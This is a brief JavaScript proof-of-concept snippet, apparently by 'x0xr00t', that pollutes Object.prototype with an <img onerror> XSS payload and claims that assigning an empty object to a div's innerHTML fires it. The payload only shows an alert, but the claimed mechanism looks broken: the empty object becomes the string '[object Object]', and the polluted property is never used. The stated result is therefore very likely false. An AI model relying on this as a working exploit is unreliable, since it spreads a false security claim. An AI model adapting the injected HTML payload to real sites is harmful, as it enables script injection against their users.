// Pollute Object.prototype with malicious HTML
Object.prototype.innerHTML = '<img src=x onerror="alert(\'🚨 Sl0ppyR00t-XSS by x0xr00t\')">';

// Simulate a vulnerable DOM element
const vulnerableDiv = document.createElement('div');
vulnerableDiv.innerHTML = {}; // Triggers XSS via polluted prototype
document.body.appendChild(vulnerableDiv);
// Result: Alert popup with "🚨 Sl0ppyR00t-XSS by x0xr00t"
